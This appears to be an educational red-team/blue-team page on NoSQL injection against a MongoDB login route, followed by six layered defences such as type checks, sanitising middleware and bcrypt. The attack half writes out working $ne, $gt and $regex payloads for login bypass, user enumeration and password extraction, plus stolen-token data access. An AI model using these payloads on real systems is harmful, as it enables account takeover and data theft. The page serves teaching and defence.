01 — OVERVIEW

What is NoSQL
Injection?

Unlike SQL injection which manipulates string-based queries, NoSQL injection sends JSON objects containing MongoDB operators as credentials. Because the server passes these objects directly to MongoDB, the database interprets them as query logic — not as literal strings.

⚡ VULNERABLE
auth.js — vulnerable login
// Input goes straight to MongoDB const user = await User.findOne({ username: username, // ← attacker controls password: password // ← attacker controls }); // When password = {"$ne":""} // MongoDB runs: // WHERE password != "" // → matches ANY real password!
✓ SECURE
auth.js — secured login
// D1: reject non-strings first if (typeof username !== 'string' || typeof password !== 'string') { return res.status(400).json({ message: 'Invalid input' }); } // D3: bcrypt defeats $regex const ok = await bcrypt.compare( password, user.password ); // {"$ne":""} → 400 rejected // → All injection blocked ✓

RED TEAM — PENETRATION TESTING

6 injection attack vectors demonstrated against POST /api/auth/login

03 — ATTACKS

The 6 Attack Vectors

1

Password Bypass — $ne

CRITICAL

Login as admin with zero knowledge of their password. {"$ne":""} means "not equal to empty" — which matches any real password stored in the database.

Attack 1 payload
{ "username": "admin", "password": { "$ne": "" } } // MongoDB: password != "" // → matches ANY non-empty password
2

Blind Login — $gt

CRITICAL

Login without knowing any credentials at all. {"$gt":""} matches any string that is greater than empty — which is every real username and password.

Attack 2 payload
{ "username": { "$gt": "" }, "password": { "$gt": "" } } // Returns first user in DB // → no credentials needed
3

User Enumeration — $regex

HIGH

Iterate through the alphabet with $regex to discover all usernames. Each letter reveals which users exist in the database.

Attack 3 payload
{ "username": { "$regex": "^s" }, "password": { "$gt": "" } } // Try ^a, ^b … ^z // → discovers: student1, student2
5

Targeted Takeover — $ne

CRITICAL

Lock onto a specific user by name and bypass their password. {"$ne":"wrongpassword"} matches because the real password is never the specified wrong value.

Attack 5 payload
{ "username": "student2", "password": { "$ne": "wrongpassword" } } // Real pwd ≠ "wrongpassword" // → student2 login success
4

Password Extraction — Character-by-Character $regex

CRITICAL

Extract the full plaintext password one character at a time. Each request tests whether the password starts with a given prefix. On success (HTTP 200), extend the prefix. Repeat until the complete password is revealed.

Extraction loop (pseudocode)
for char in "abcdefghijklmnopqrstuvwxyz0-9": payload = { "username": "admin", "password": { "$regex": f"^{attempt}{char}" } } if POST → 200 OK: attempt += char // extend break // ~270 requests → full password
6

Data Exfiltration — Stolen Token → Private Notes

CRITICAL

Every successful injection above returns a valid session token. That token grants full access to any authenticated API route. The attacker now reads, creates, edits, or deletes the victim's private notes.

Attack 6
// Use token from any attack 1–5 GET /api/notes Authorization: Bearer <STOLEN_TOKEN> // Response: victim's notes [ { "title": "System Config", "content": "MongoDB on port 27017…" }, … ]
BLUE TEAM — INCIDENT RESPONSE

6 layered defences — no single bypass possible when controls are combined

04 — DEFENCES

Defence-in-Depth

Each defence layer independently blocks one or more attacks. Together, they ensure that bypassing any single control does not lead to compromise.

D1

Input Type Validation

Counters Attack 1 Counters Attack 2 Counters Attack 5

Rejects any request where username or password is not a plain string. MongoDB operator objects are blocked before reaching the database.

auth.js
if (typeof username !== 'string' || typeof password !== 'string') { return res.status(400).json({ message: 'Invalid input' }); }
D2

MongoDB Sanitization

Counters All Operator Attacks

Global middleware strips any key containing $ from req.body, req.query, and req.params before any route handler sees the input.

server.js
const sanitize = require('express-mongo-sanitize'); // Strips $ operators globally app.use(sanitize.sanitize); // {"$ne":""} → removed
D3

bcrypt Password Hashing

Counters Attack 4

Passwords are stored as bcrypt hashes. A regex like ^a can never match $2b$12$… — character extraction returns no results.

auth.js
// Signup const hash = await bcrypt.hash(pwd,12); // Login comparison const ok = await bcrypt.compare( plainPwd, user.password ); // $regex "^a" ≠ "$2b$12$…"
D4

Rate Limiting

Counters Attack 3 Counters Attack 4

10 login attempts per IP per 15 minutes. Attacks 3 and 4 require hundreds of requests — rate limiting transforms seconds of work into days.

server.js
const limiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 10, message: 'Too many attempts' }); app.use('/api/auth/login', limiter);
D5

Generic Error Responses

Breaks Enumeration Loop (A3)

Replaces distinct error messages ("User not found", "Wrong password") with a single unified response — removing the signal attackers use to enumerate users.

auth.js
// Before (leaks info) if (!user) → "User not found" if (!match) → "Wrong password" // After (unified) return res.status(401).json({ message: 'Invalid credentials' });
D6

Security Event Logging

Detection Layer — All Attacks

All failed login attempts are logged with timestamp, IP, and payload shape. Non-string fields immediately flag injection attempts in real time for response teams.

server.js
if (typeof username !== 'string') { console.warn('[ALERT]', { ip: req.ip, time: new Date(), payloadShape }); }

MongoDB Operators Exploited
$ne
Not equal — matches any value that isn't the specified string
$gt
Greater than — matches any non-empty string, i.e. all real credentials
$regex
Pattern match — enables user enumeration and character-by-character extraction
$in
In array — matches against a list of known values simultaneously
$exists
Field existence check — confirms whether a field is present in the document
$where
JavaScript execution — allows arbitrary code to run in the MongoDB query context
06 — SUMMARY

Key Takeaways

Red Team Findings

6 distinct attack vectors on a single endpoint — none requiring prior knowledge of credentials

Authentication fully bypassed with a single JSON object — no brute force, no dictionary attack

Plaintext passwords extractable character-by-character using ~270 automated requests

Stolen session tokens grant full downstream data access — all private notes exfiltrated

All attack routes discoverable via browser DevTools — no source code access required

Blue Team Defences

D1: Strict type checking — operator objects rejected before reaching the database layer

D2: Global mongo-sanitize middleware strips all $ keys from every request body and query string

D3: bcrypt hashing makes the regex extraction attack physically impossible — hashes can't match prefix patterns

D4: Rate limiting raises the cost of enumeration from seconds to days — brute-force is economically unviable

D5+D6: Generic errors remove feedback loops; security logging enables real-time detection and IP blocking

No single defence is sufficient on its own.
The layered approach ensures that even if one control fails or is misconfigured,
the remaining controls prevent compromise — this is the core principle of defence-in-depth.
